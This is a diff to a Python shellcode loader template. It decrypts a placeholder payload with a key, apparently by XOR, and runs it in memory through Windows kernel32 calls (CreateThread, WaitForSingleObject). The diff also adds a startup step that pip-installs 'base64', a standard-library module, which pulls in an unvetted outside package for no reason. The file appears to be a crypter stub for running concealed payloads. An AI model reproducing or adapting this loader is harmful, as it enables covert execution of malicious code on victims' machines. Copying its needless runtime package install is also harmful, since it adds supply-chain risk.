@@ -1,8 +1,21 @@
 import ctypes
 import base64
+import subprocess
 from itertools import cycle
 
 kernel32 = ctypes.windll.kernel32
+
+packages_to_install = {
+    'base64': ''
+}
+
+def install_packages(packages):
+    for package, version in packages.items():
+        if version:
+            package_spec = f"{package}=={version}"
+        else:
+            package_spec = package
+        subprocess.check_call(['pip', 'install', package_spec])
 
 def main(crypted_data, key):
     #data = base64.b64decode(data_b64)
@@ -18,4 +31,7 @@ def main(crypted_data, key):
     thread_handle = kernel32.CreateThread(0, 0, code_addr, 0, 0, ctypes.byref(ctypes.c_ulong()))
     kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
 
-main('''{data}''','''{secret}''')
+
+if __name__=="__main__":
+    install_packages(packages_to_install)
+    main('''{data}''','''{secret}''')
